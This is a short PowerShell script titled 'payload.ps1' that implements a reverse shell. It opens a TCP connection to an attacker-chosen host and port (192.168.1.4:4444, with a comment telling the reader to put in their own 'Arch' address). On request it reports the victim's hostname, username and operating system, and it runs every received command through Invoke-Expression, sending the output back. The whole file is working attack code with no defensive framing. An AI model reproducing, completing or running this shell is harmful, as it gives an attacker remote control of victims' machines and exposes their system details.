# payload.ps1 - CORRECTED HANDSHAKE PROTOCOL
$serverIP = "192.168.1.4"  # ← REPLACE WITH YOUR ARCH IP
$serverPort = 4444

function Get-SystemInfo {
    $hostname = $env:COMPUTERNAME
    $username = $env:USERNAME
    $os = (Get-WmiObject Win32_OperatingSystem).Caption
    return "SYSINFO:$hostname|$username|$os"
}

try {
    $client = New-Object System.Net.Sockets.TCPClient
    $client.Connect($serverIP, $serverPort)
    
    $stream = $client.GetStream()
    $writer = New-Object System.IO.StreamWriter($stream)
    $writer.AutoFlush = $true
    $reader = New-Object System.IO.StreamReader($stream)
    
    # Main loop
    while ($true) {
        $command = $reader.ReadLine()
        if (-not $command) { break }  # Connection closed
        
        # SPECIAL HANDLING FOR SYSINFO REQUEST
        if ($command -eq "SYSINFO?") {
            $writer.WriteLine((Get-SystemInfo))
            continue
        }
        
        if ($command -eq "exit") {
            break
        }
        
        # Execute command and send result
        $result = iex $command 2>&1 | Out-String
        $writer.Write($result)
    }
}
finally {
    $client.Close()
}
